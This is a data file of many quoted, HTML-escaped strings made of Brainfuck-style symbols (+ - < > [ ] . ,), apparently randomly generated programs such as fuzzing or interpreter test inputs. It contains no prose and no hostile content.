&quot;-&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+--&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-&lt;&gt;+-+-&gt;&lt;&gt;&lt;--&lt;&gt;-++--+--+-[+--+-+&lt;&gt;&lt;&lt;&gt;&lt;&gt;-++&lt;&gt;-++--+&lt;&gt;&gt;[+-+--+&lt;&gt;-+-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;]&quot; &quot;&gt;&lt;]&gt;&lt;,&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;&lt;&gt;++-+&gt;&lt;-+&lt;&gt;+-++-+&lt;&gt;-+&lt;&gt;++--+&gt;&lt;-+[+-+-&lt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;-++---++--+-+-&gt;&lt;-+-&gt;&lt;-&lt;&gt;+-&gt;&lt;--+-&gt;&lt;&gt;&lt;&lt;&gt;&quot; &quot;--+&lt;&gt;&lt;&gt;&gt;&lt;-&lt;&gt;&lt;&gt;&lt;&gt;-++--+-&gt;&lt;-&gt;&lt;-+--+-&gt;&lt;-&gt;&lt;+--&lt;&gt;&gt;&lt;--++--&lt;&gt;&gt;&lt;-+&gt;&lt;+----++-&gt;&lt;&lt;&gt;&gt;&lt;-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;--+&gt;&lt;&lt;&gt;&lt;&gt;&gt;-&lt;&gt;-+&quot; &quot;&gt;&lt;]-+-+&lt;&gt;&lt;+--+-+&lt;&gt;[&gt;&lt;+-&lt;&gt;&lt;+-&gt;&lt;-++-+&lt;&gt;+-&lt;&gt;&gt;+-&lt;&gt;&gt;&lt;&lt;&gt;[--+-++-+-&lt;&gt;]&lt;&gt;-+&gt;&lt;&gt;&lt;][.+.+],+-&gt;&gt;&lt;&gt;&lt;&gt;&lt;-+&lt;&gt;++&gt;&lt;&gt;&lt;+-&quot; &quot;+-+&gt;&lt;&gt;&lt;-+++-+-+-&gt;&lt;+&gt;&lt;-+-+&gt;&lt;-+++-++-+-&lt;&gt;+&gt;&lt;+-+-&gt;&lt;&gt;&lt;+&lt;&gt;&gt;&lt;+&lt;&gt;[&lt;&gt;-+&lt;&gt;&lt;&gt;&lt;--&gt;&lt;&lt;&gt;&gt;&lt;-+--+-&lt;&gt;-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;-++--+&quot; &quot;-&gt;&lt;][&gt;-,[&gt;.+&lt;--]&lt;.[+[&lt;&lt;[&lt;[--&lt;[&gt;&lt;-&lt;],.[[-&gt;,.],&gt;&gt;]&lt;.+].+-,]++]+[&gt;,[-+[[[+-&lt;&gt;&gt;&lt;.]&lt;-].-,]+-,]]&gt;]&gt;]+-&lt;+-&lt;&quot; &quot;&gt;-+-+--+&gt;&lt;-[&gt;&lt;-++-&lt;-+&lt;&gt;-++-++-&gt;-+&lt;&gt;[+--+-&gt;&lt;&lt;&gt;][++--[.,&gt;+--[.&lt;,[&gt;,[,[[-&gt;[[[--&gt;--.]&gt;+-,-]&gt;.&gt;]],[.&gt;[-+,&quot; &quot;[&lt;.,&gt;[+&lt;&gt;,,+&lt;&lt;.],+]]--[+.&gt;&lt;,[&gt;-,[+,]--&gt;]+.].,&lt;]]+]++].[&lt;+.].,+].&gt;-],+]&gt;&lt;&lt;&gt;]&gt;&lt;&lt;&gt;,&gt;&lt;&lt;&gt;&gt;&lt;&gt;+-+-+&lt;&gt;&lt;&gt;++-+&quot; &quot;&gt;&lt;-+&gt;&lt;+-++--++&gt;&lt;-++-&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;-++-+&lt;&gt;+[&lt;&gt;&lt;+--+-&gt;&lt;-+-&gt;&lt;-+---+-+--++--&gt;&lt;-+-&lt;&gt;&lt;&gt;-+&gt;&lt;-+--+&gt;&lt;-+-+-&lt;&gt;-&gt;&lt;-++&quot; &quot;-&gt;&lt;-+--+-&gt;&lt;&gt;--+]&lt;+-&lt;&gt;&lt;&gt;-&lt;&gt;-+&gt;&lt;&lt;&gt;-+-&lt;&gt;--++-[&gt;&lt;-+&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;+-+-[-++-&lt;&gt;&lt;&gt;-+-+--+]+-&lt;&gt;&gt;&lt;&lt;&gt;],&gt;&lt;+&quot; &quot;-&gt;&lt;-+-+&gt;+&gt;&lt;+-&lt;&gt;-++&lt;&gt;++--++-++-+&gt;&lt;&gt;&lt;&lt;&gt;+-++-&lt;&gt;[&lt;&gt;+-&lt;&gt;&lt;-+-&gt;&lt;-+&lt;&gt;&gt;&lt;-+--+&gt;&lt;&lt;&gt;---&gt;&lt;+--+&lt;&gt;&gt;&lt;--+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&quot; &quot;&lt;+--&lt;&gt;-+-&gt;--+&gt;&lt;+-&gt;&lt;]+--+&gt;&lt;&lt;&lt;&gt;--+-+-+-+--+&gt;&lt;-+&gt;&lt;-&lt;&gt;-+[&lt;&gt;&gt;&lt;-+&lt;&lt;&gt;-++&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;[-+-&gt;&lt;+--+][[-&gt;&gt;[+&lt;.[&gt;&gt;-].&quot; &quot;&lt;,&lt;],]-+&lt;]&gt;&lt;]&lt;&gt;&lt;&gt;&lt;&gt;+--+,&gt;&gt;&lt;-+&lt;&gt;+--+++-+-+-+&gt;&lt;+-&gt;&lt;+-+-++-&gt;&lt;+&lt;&gt;+-+-+-+-+-+&lt;&gt;+-+-+-+&lt;&gt;++&lt;&gt;&lt;&gt;-+[&gt;&lt;&lt;&gt;+-&lt;&lt;&quot; &quot;&gt;&gt;&lt;&lt;&gt;+--+--&lt;&gt;+-+--+-&lt;&gt;+-&lt;&gt;-+-+-&lt;&gt;-&gt;&lt;&gt;&lt;-&gt;&lt;&lt;&gt;+-&lt;&gt;&gt;+-&lt;&gt;-+-][&lt;-++&lt;.-&gt;]&lt;&gt;+-&gt;&lt;&gt;&lt;-+&lt;+-+-[&lt;&lt;&gt;-++--++&lt;&gt;&gt;&lt;&gt;&gt;&lt;&lt;&quot; &quot;&gt;-+[&gt;&lt;-++-+--+-+-&lt;&gt;+--+][[&lt;+,[&gt;&lt;+.]+]+.[&lt;[.-&gt;&lt;]-+&gt;-],]&gt;&lt;+-&gt;&lt;-++-]&gt;&lt;&gt;&lt;,&lt;&gt;&lt;&gt;&lt;&gt;&gt;++-+-+-&lt;&gt;+-+-++-++-+-&gt;&lt;&quot; &quot;+-++--++-+-+[+-+-+--++-&lt;-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;--+&gt;&lt;--&gt;&lt;-++--+-&lt;&gt;+--+-+-&gt;&lt;&lt;&gt;+-&gt;&lt;-+-&lt;&gt;&lt;&gt;+-+--&gt;&lt;-+-&lt;&gt;-+-+-&lt;&gt;-&gt;&lt;&gt;-+&quot; &quot;-]-+&lt;-&lt;&gt;-+-+[&gt;&lt;&gt;&lt;+-&lt;+-+&lt;&gt;&gt;+-&gt;&lt;&lt;&gt;-+[+-&gt;&lt;&gt;&lt;+--]]-+-+&gt;&lt;-+-+,+-&gt;&lt;&gt;+--++-+&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;++-+&lt;&gt;+-++-+[&gt;&lt;&lt;&gt;+&quot; &quot;-&lt;-+&lt;&gt;-&lt;&gt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;&lt;&gt;+--+--+&lt;&gt;+--++--+-&lt;&gt;&lt;&gt;&lt;&gt;--+&lt;&gt;-++---+-&gt;&lt;-&lt;&gt;+-&gt;-+-&lt;&gt;&lt;&gt;][[--,[&lt;&lt;-[&gt;[,&gt;.[.,-[.+[&lt;,&quot; &quot;&lt;-.[-+-],]&gt;]++.],&gt;&lt;],,,]&lt;.-+,].&lt;]-[&gt;+-[.-&lt;,],,.[&lt;[&lt;-,--+-++]+-.+]-]&lt;-+]&lt;&gt;-+&lt;-&lt;&gt;+-+--+-+--+--++--[&lt;&gt;-&quot; &quot;+&gt;&lt;&gt;&lt;&lt;++-&lt;&gt;+-&gt;&lt;&gt;&gt;&lt;-+[+-&gt;&lt;-+&gt;&lt;&gt;&lt;-][+--.&lt;]+--+&lt;&gt;&gt;&lt;&gt;&lt;]-++-,+-&gt;-++-&lt;&gt;&gt;&lt;&lt;&gt;+++&gt;&lt;+-+-+&lt;&gt;+++-+++&gt;&lt;+-&gt;&lt;&gt;&lt;&lt;&gt;[-&quot; &quot;+&lt;&gt;&gt;&lt;&lt;&lt;&gt;+--+-+---+-+&lt;&gt;-+-&lt;&gt;&gt;&lt;&gt;&lt;--&lt;&gt;+-&gt;&lt;-&lt;&gt;-+-+&gt;&lt;-&gt;&lt;&gt;&lt;+-+-&lt;&gt;--++-&lt;&gt;&lt;&gt;---+-&gt;+--+-++--+-&lt;&gt;-+&lt;&gt;+-]&gt;&lt;-+&lt;+&quot; &quot;-&gt;&lt;-&gt;&lt;+---+&gt;&lt;+-[&lt;-++&lt;&gt;&gt;&lt;+-+-&gt;&gt;&lt;&gt;&lt;[-+-+-]][[[&gt;&gt;+[.]&gt;++-]]-.]&lt;&gt;&gt;&lt;,&gt;&lt;&lt;&gt;-+-+&gt;&lt;&gt;-+&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;++-+-+-&gt;&lt;&lt;&gt;+&gt;&lt;&quot; &quot;+-+&gt;&lt;+&lt;&gt;+-+&gt;&lt;+-&gt;&lt;+&lt;&gt;-++&gt;&lt;-++-[-+-+&lt;&gt;&lt;-+---++---&lt;&gt;-&lt;&gt;-+&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&gt;&lt;-+-+---+&lt;&gt;&gt;&lt;--+-+-+-&gt;&lt;&gt;&lt;+-+-&quot; &quot;-+-&gt;&lt;+-&gt;&lt;&gt;&gt;&lt;&lt;&gt;-++-&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;&lt;&gt;]+--+&lt;&gt;&lt;+---+-&gt;&lt;&lt;&gt;-++----+-+&gt;&lt;--+-+&lt;&gt;+---+&lt;&gt;&gt;&lt;&gt;&lt;-+[+--+-+-+&gt;&lt;&lt;+&gt;&gt;&lt;&gt;&lt;[&quot; &quot;-+&lt;&gt;-+&gt;&lt;+--+-+-]-++-+-][&gt;-[.+&lt;[&lt;-+&gt;.]+.&lt;[[&gt;,[[+.+&gt;]-&lt;.]+-+[+,&gt;,&gt;-,+-]]]]&gt;,-[&gt;-&lt;[-,&lt;-&gt;[&lt;.&gt;[+.[.-+]&gt;,[&quot; &quot;,[.-]&gt;]&gt;]+&gt;[[&gt;-,]+-+].]],&lt;[&lt;&lt;..-&gt;&lt;].]]-+,-+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-+&lt;&gt;&gt;&lt;-++-+&lt;&gt;+-&lt;&gt;+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-++-&gt;&lt;-+&gt;&lt;-++++&gt;&lt;+-+&quot; &quot;&gt;&lt;&lt;&gt;&lt;&gt;+-+-+&lt;&gt;+-++-+-&lt;&gt;&lt;&gt;[-+&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;&lt;&gt;+--&lt;&gt;&lt;&gt;-+-+---+-+--&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+&gt;+-&lt;&gt;+-&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;][[.[&gt;&gt;-[.&gt;.[[..[&quot; &quot;+,,]&lt;.&gt;[..&lt;&gt;+..]+&lt;]&lt;&gt;]+-]&gt;&gt;&gt;[[--,-],+&gt;.-]-.]&gt;]+-]&lt;-+-[+-&lt;&lt;&gt;&gt;&lt;&gt;&lt;+&gt;+-[-+&lt;&gt;&lt;&gt;&lt;&gt;-+-&lt;&gt;+-+-+-]&gt;&lt;+-+-&lt;&gt;],&gt;&lt;&quot; &quot;+--+&gt;-+&gt;&lt;+-&lt;&gt;++-++-+&gt;&lt;-+++-+-&gt;&lt;+&gt;&lt;-++-&lt;&gt;+&gt;&lt;&lt;&gt;+-&lt;&gt;-+++-&lt;&gt;&gt;&lt;+&gt;&lt;&lt;&gt;&gt;&lt;+-+&gt;&lt;-+&lt;&gt;-+[&lt;&gt;&lt;-&lt;&gt;-+-+-&gt;&lt;&gt;&lt;+--+--+&gt;&quot; &quot;&lt;-+-+-+-&lt;&gt;&gt;&lt;+-+--&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;+-&gt;-++---+-++-][,[.[...&lt;,&lt;&lt;+,]]-.]+-&lt;&gt;-+-+&lt;&gt;&lt;-+&lt;&gt;&gt;&lt;&lt;&gt;-&gt;&lt;-&lt;&gt;+-&gt;&lt;---&lt;&gt;--&lt;&gt;-+-&quot; &quot;++-+--[&gt;&lt;&lt;++-+--+-++-&gt;-+&gt;&lt;-+&gt;&lt;+-[-+-]]+-&lt;&gt;,+-+-&gt;++-+-&gt;&lt;-+&gt;&lt;+&lt;&gt;&gt;&lt;&gt;&lt;-+-++&lt;&gt;&gt;&lt;&lt;&gt;+&lt;&gt;&gt;&lt;-++&lt;&gt;-+&gt;&lt;+++-&gt;&lt;+-+&quot; &quot;-&gt;&lt;+&lt;&gt;+-+&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;[+-&gt;&lt;&lt;-+&lt;&gt;+-&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;-&gt;&lt;--+-&lt;&gt;&lt;&gt;-+-+-&gt;&lt;&gt;+-&gt;&lt;&lt;&gt;--+&gt;&lt;+-&lt;&gt;-+][[,.-,.]]+-&gt;&lt;-+&lt;&lt;&gt;+-&quot; &quot;&gt;&lt;&lt;&gt;&lt;&gt;-+-&gt;&lt;--+---+-++--&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;--++--+-&lt;&gt;-+&lt;&gt;&lt;&gt;[&lt;-+&lt;&gt;&lt;&gt;&lt;&gt;+&gt;-+&gt;&lt;&gt;&lt;&lt;&gt;-+[-&gt;&lt;-+]&lt;&gt;&lt;&gt;&lt;&gt;+-&gt;&lt;][..,[,.[-&gt;&lt;&quot; &quot;.&lt;]-,[[&lt;&gt;&gt;[&gt;[&gt;,&lt;[&gt;&gt;+,[+[[-,-+]&lt;]&gt;,[++[&lt;,&gt;&gt;+-&lt;][&gt;],&gt;]-&gt;&gt;].],&lt;],+.,]-,[-[&gt;,,+][+[[&lt;&gt;],&lt;&gt;]].-]-&gt;,]]&lt;+&gt;]&quot; &quot;+[&gt;&lt;&gt;+.&gt;&lt;]-]&lt;&gt;-+&gt;&lt;+-,+-+--+-+&gt;&lt;&gt;+-+&gt;&lt;-+&gt;&lt;+&gt;&lt;-++-&gt;&lt;+-+-++--++++--++&gt;&lt;-++-++&gt;&lt;&lt;&gt;-+-+-+[-+-+&lt;&lt;&gt;-&gt;&lt;&gt;&lt;+-&gt;&quot; &quot;&lt;&lt;&gt;-+-&gt;&lt;+--+-+--+&lt;&gt;&lt;&gt;--+&gt;&lt;+-+-&lt;&gt;-&gt;&lt;&lt;&gt;-&lt;&gt;+-&lt;&gt;+--+---+&lt;&gt;&lt;&gt;+--&lt;&gt;+--+-&lt;&gt;--+&lt;&gt;-+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;+--&gt;&lt;&gt;&lt;&quot; &quot;-+&gt;&lt;][&gt;+&gt;--]&gt;&lt;-+-+&lt;-++--+-&gt;&lt;&gt;&lt;--+-&lt;&gt;+-&lt;&gt;-++-[-++-&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+&lt;&gt;&gt;[-+&gt;&lt;&gt;&lt;-+-+-&gt;&lt;-+-++-]&gt;&lt;&lt;&gt;][,,+-&gt;-+]&lt;&gt;&lt;&quot; &quot;&gt;-+-+,+-&lt;&gt;-+-+-+&gt;&lt;&gt;+-&gt;&lt;+&gt;&lt;+-+-+&gt;&lt;+&lt;&gt;&gt;&lt;++-&lt;&gt;&lt;&gt;+-+-+&gt;&lt;+--++-++-++-++-+[&lt;&gt;&lt;&gt;&lt;&gt;&lt;+--+-&lt;&gt;+---&lt;&gt;&lt;&gt;-+&lt;&gt;-&gt;&lt;--&quot; &quot;+&gt;&lt;&lt;&gt;+-&lt;&gt;&gt;&gt;&lt;-+-+-&lt;&gt;-+]-+&lt;&gt;+-+-+-&lt;--+&lt;&gt;--&gt;&lt;-+&lt;&gt;--&lt;&gt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&lt;&gt;+-[-+&lt;-++--+&lt;&gt;+&lt;&gt;-+&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;[-+&lt;&gt;&gt;&lt;+-&quot; &quot;-+-+--+&lt;&gt;]&lt;&gt;]+--+,&gt;&gt;&lt;-+&gt;&lt;+&lt;&gt;&gt;&lt;+&gt;&lt;++-+&lt;&gt;+-&gt;&lt;++--++&lt;&gt;&lt;&gt;[&gt;&lt;+--+&lt;&gt;&lt;&lt;&gt;--+&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;+-&gt;&lt;-+-&lt;&gt;-&lt;&gt;-+-+-+--+&quot; &quot;-+-+---+-++--&lt;&gt;&lt;&gt;&gt;&lt;-+---+&gt;&lt;-+&gt;&lt;&lt;&gt;-&lt;&gt;-+&gt;&lt;&lt;&gt;--+---&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-&lt;&gt;+-]&lt;&lt;&gt;&gt;&lt;+--&gt;&lt;---&lt;&gt;&gt;&lt;+--+[+-&lt;&gt;&gt;&lt;&lt;+&quot; &quot;&gt;&lt;-+&lt;&gt;&lt;&gt;&gt;&gt;&lt;-+&gt;&lt;-+[-+--+&gt;&lt;+-]&gt;&lt;][[[-+,.],.,-].&lt;,[&lt;,+[&gt;...[&lt;&lt;,[+[,&gt;&gt;[+.-[.+[[&lt;,+][,&lt;,+-&gt;&lt;]&lt;&gt;].,,&gt;][&gt;,.&quot; &quot;.]+&lt;]-+],,]]&lt;]+,.]]+-+-&lt;&gt;+-,+-+-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+&gt;&lt;&gt;&lt;+-++-+-++&gt;&lt;&gt;&lt;+-&gt;&lt;&lt;&gt;++-&lt;&gt;++-&gt;&lt;-++-+-[&gt;&lt;&lt;&gt;+-&lt;+-+-+-&gt;&lt;+----&quot; &quot;-+-+---+-+--++--&lt;&gt;+-&gt;&lt;&gt;&lt;-+-&gt;&lt;+----+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;--+--&gt;&lt;--+-+&gt;&lt;-+-&lt;&gt;+-&gt;&lt;-+-+-&gt;-]&gt;&lt;&gt;&lt;-+&lt;&lt;&gt;+--+-&lt;&gt;&lt;&gt;--+-+-++&quot; &quot;---++--+-+-&lt;&gt;+-&lt;&gt;&gt;&lt;-+-&lt;&gt;[&lt;&gt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;+--+++-&gt;&lt;&gt;&lt;&gt;[-+-+-&gt;&lt;][&lt;.[&lt;&gt;[.[,-,[.,,]&lt;-+[&gt;[.[,[-[[.&gt;&lt;][-&gt;+&lt;].&gt;]&quot; &quot;&gt;&lt;&gt;[[&gt;&lt;,]-.&lt;[&lt;,+..]]+&gt;-]&gt;&gt;[&lt;[-.&gt;-&lt;[+&lt;+&gt;,].&lt;]&lt;[--[&gt;-]],]&gt;]&gt;&gt;[[&gt;.+++]-+++.]].,&gt;-&lt;]&gt;+]&gt;&lt;+]&lt;&gt;-[+++[,,&lt;[,&quot; &quot;..-[..-]&gt;-],],+]+]+[+&gt;[&lt;&gt;+-.-[+[.+-]+&gt;&gt;&lt;&lt;-]],]&lt;]+-&gt;&lt;-+&lt;&gt;][.[,,-&gt;+&lt;],-+]-+,&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-++&gt;&lt;-++-+-&gt;&lt;++&lt;&gt;&quot; &quot;+-&lt;&gt;++-++-++-+&lt;&gt;[+-+-&lt;&lt;&gt;-&gt;&lt;+--+--+--+&lt;&gt;+--&gt;&lt;-+&lt;&gt;--+-+-&gt;&lt;&lt;&gt;-+-&lt;&gt;&gt;&lt;+--+&gt;-++---+][&lt;+&lt;+]&lt;&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;-+-+&quot; &quot;-&gt;&lt;+-+-[&gt;&lt;&lt;&gt;&lt;+--+&lt;&gt;-++&lt;&gt;+-&gt;[+-+-+-+--&lt;&gt;-+-+&lt;&gt;-+]&lt;&gt;+-&lt;&gt;-+]&lt;&gt;-++-,&gt;&lt;&lt;&gt;&lt;&gt;&gt;+-+-++&gt;&lt;&lt;&gt;+--++-+-+&gt;&lt;++[-++-&lt;&quot; &quot;-+-+&gt;&lt;-+-+-&lt;&gt;&lt;&gt;--+&lt;&gt;+--++--&gt;&lt;+--+--+&lt;&gt;&lt;&gt;+-+---++-&lt;&gt;&gt;&lt;&gt;&lt;----&gt;&lt;--++-&gt;-+&lt;&gt;-+-+-&lt;&gt;]&gt;&lt;&lt;&gt;-+&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;-&lt;&gt;[-+&quot; &quot;+-+-&lt;+--++-++-&gt;[-+-&gt;&lt;&gt;&lt;-+]&gt;&lt;-+][+&gt;[+&lt;,[+[,+[,&lt;&lt;,+,]&lt;.],-&gt;]+&gt;]-]+--+-++-,+--+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+++-++-&gt;&lt;&lt;&gt;&lt;&quot; &quot;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&lt;&gt;++-++-&lt;&gt;&gt;&lt;+--+++-&gt;&lt;+-+-++-&gt;&lt;+-+&lt;&gt;&lt;&gt;+-+&lt;&gt;&gt;&lt;[&lt;&gt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;+-&gt;&lt;+---&gt;&lt;-+-+--&lt;&gt;&gt;&lt;&gt;&lt;--+-+-+----&gt;-]+&quot; &quot;-&lt;&gt;&lt;&lt;&gt;&lt;&gt;--+&gt;&lt;+-&gt;&lt;&gt;&lt;--++-+-&gt;&lt;--&lt;&gt;--+-+&gt;&lt;&lt;&gt;--+&gt;&lt;&gt;&lt;-[&lt;&lt;&gt;&lt;&gt;&lt;&gt;+-+&gt;&lt;&gt;[-]&lt;&gt;&gt;&lt;-+][.-&gt;[[&lt;.-.&gt;].+[,[&lt;[,&lt;-[.&gt;+-&quot; &quot;],.&gt;+&lt;]+[[[,]],&lt;+++]&gt;-]&lt;-]&gt;+&lt;].&lt;&lt;[&lt;&gt;-,&gt;&gt;]],+-&gt;&lt;&gt;-++-+-+&lt;&gt;&lt;&gt;+-+++-+++-[&lt;&gt;&gt;&lt;&lt;&lt;&gt;+--&lt;&gt;&lt;&gt;-&gt;&lt;--+-++-&gt;&lt;&lt;&gt;-+&quot; &quot;-&lt;&gt;-+-+&lt;&gt;--&gt;&lt;&gt;&lt;-+-&gt;&lt;&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;&gt;-+-&gt;&lt;&lt;&gt;&lt;&gt;-+--+-+&gt;&lt;-+&gt;&lt;-+-&gt;&lt;&lt;&gt;&gt;+--&gt;&lt;&gt;&lt;+-]&gt;&lt;&lt;+--[-+-+&lt;&gt;-+&lt;+--++&quot; &quot;-&gt;&lt;+-+&gt;&lt;&lt;&gt;-+&lt;&gt;+-&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;[-+&lt;&gt;-&lt;&gt;&lt;&gt;-+&gt;&lt;][,-+&gt;---]&lt;&gt;-++-+-&gt;&lt;][,-],&gt;&lt;-+-+&gt;+-++--+&gt;&lt;+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;+-++-++-&lt;&gt;&quot; &quot;+-+-&lt;&gt;+&gt;&lt;++--+++[&gt;&lt;-+&lt;&gt;-+-+&lt;&gt;&lt;-+-+-+-&gt;&lt;-&lt;&gt;&lt;&gt;&lt;&gt;-&gt;&lt;-+&gt;&lt;-&lt;&gt;-&gt;&lt;&gt;&lt;+-+-&gt;&lt;-&lt;&gt;+--+-+--&lt;&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;-+-&gt;&lt;+-&gt;&lt;&lt;&gt;-&quot; &quot;+--+---+-+&gt;&lt;+-&gt;&lt;&gt;+--+-&gt;&lt;-+-+-+]&lt;+-+-+---&gt;&lt;&gt;&lt;-+--++--&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;-+-&gt;&lt;-+[&lt;-+-++-+&gt;&lt;&lt;&gt;&gt;-++-&lt;&gt;[&gt;&lt;&gt;&lt;+-+---&quot; &quot;+][.-[[.,-[&gt;&lt;&gt;[&lt;&gt;,.+]-+&gt;],&gt;,[,&gt;-[+&lt;+[[,-+,[&gt;[&lt;+[+&lt;+,]&gt;-.[-.-.]&lt;.-]++]&gt;&lt;,]&gt;&gt;[[.-,+&gt;]+&lt;-]]&gt;+],.]]--&gt;,-&quot; &quot;]+&lt;.&lt;]-+&lt;&gt;+-&gt;&lt;]+-+-,-+-+&gt;&lt;+-&gt;-+&lt;&gt;+&lt;&gt;+&lt;&gt;+-&lt;&gt;+-+&gt;&lt;&lt;&gt;&lt;&gt;+&lt;&gt;-++-++--++-&lt;&gt;+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+&gt;&lt;+&lt;&gt;+-+&gt;&lt;+-+&lt;&gt;[&gt;&lt;&gt;&lt;&quot; &quot;+-&lt;&gt;&lt;-&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;-+&lt;&gt;--+&gt;&lt;-&gt;&lt;+-+-&lt;&gt;+-&gt;-+-+-&lt;&gt;-+][]&lt;--+-&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;+-+-+--&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;+-&gt;&lt;--&lt;&gt;-+&quot; &quot;&lt;&gt;&gt;&lt;+--&gt;&lt;&gt;&lt;+---+&lt;&gt;+--+-+[-++--++-+-&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-+&gt;&lt;&gt;&lt;-+[&gt;&lt;--++-+-]+-&gt;&lt;-++-][&lt;+[&lt;..]]&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;,&lt;&gt;&gt;&gt;&quot; &quot;&lt;&gt;&lt;&gt;&lt;+++-&gt;&lt;&gt;&lt;-+++-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;+-+++&lt;&gt;+-&gt;&lt;[&gt;&lt;+--+&gt;&lt;&gt;&lt;&lt;-+-++-&gt;&lt;-&gt;&lt;+-&lt;&gt;+-&gt;&lt;--+-++-&gt;&lt;-&gt;&lt;&lt;&gt;--++---+-+-&lt;&gt;&gt;&lt;&quot; &quot;&gt;&lt;-+-+-&gt;&lt;-&lt;&gt;-+-&lt;&gt;+--&lt;&gt;-&lt;&gt;--&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;--+&lt;&gt;-+&gt;&lt;&gt;-][&gt;&gt;[[[&gt;-[++-[,.--,+-]--[&gt;[.-&gt;&gt;],.,[.-&gt;]]&lt;.&lt;],-[,+&lt;&lt;&quot; &quot;&gt;&gt;],.]+,&gt;[&gt;-[+&lt;&lt;]&gt;]]--,]---]&gt;&lt;&lt;&gt;&lt;-+---++--++--+-&gt;&lt;-+[+-&lt;-+&gt;&lt;+-+&lt;&gt;&gt;&lt;-+&gt;&lt;&gt;&lt;&gt;&gt;&lt;[+-&gt;&lt;-+-+-+-][.-&lt;-[&lt;[,&gt;[&quot; &quot;]--.++&lt;].-.&gt;+]]]&lt;&gt;,&gt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;+&gt;&lt;-++&gt;&lt;&gt;&lt;+&lt;&gt;&gt;&lt;+-&lt;&gt;+&lt;&gt;-+-++&gt;&lt;&lt;&gt;+-&gt;&lt;++-&lt;&gt;+-++--+++-++-&gt;&lt;[&lt;&gt;&lt;--+&lt;&gt;+--&lt;&gt;&gt;&lt;&lt;&quot; &quot;&gt;&lt;&gt;-+--&gt;&lt;&lt;&gt;&lt;&gt;-+--&gt;&lt;&lt;&gt;-+--+&gt;&lt;-+-+--++--&gt;&lt;&lt;&gt;-&lt;&gt;+-&lt;&gt;--+&lt;&gt;&gt;-+-+--+&gt;&lt;]&lt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;[&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;-++&gt;&lt;&gt;&gt;&lt;&lt;&gt;+-&lt;&quot; &quot;&gt;[+-&gt;&lt;+--]+--++-&lt;&gt;]+-&lt;&gt;&gt;&lt;-+,-+&lt;&gt;+-&gt;&lt;&lt;&gt;&gt;+-+-+&gt;&lt;+&lt;&gt;&gt;&lt;-+-+++-+-&lt;&gt;-+-+++-+++--++-&lt;&gt;&gt;&lt;+-+[+-&lt;+-+--+-&gt;&lt;-&gt;&lt;&quot; 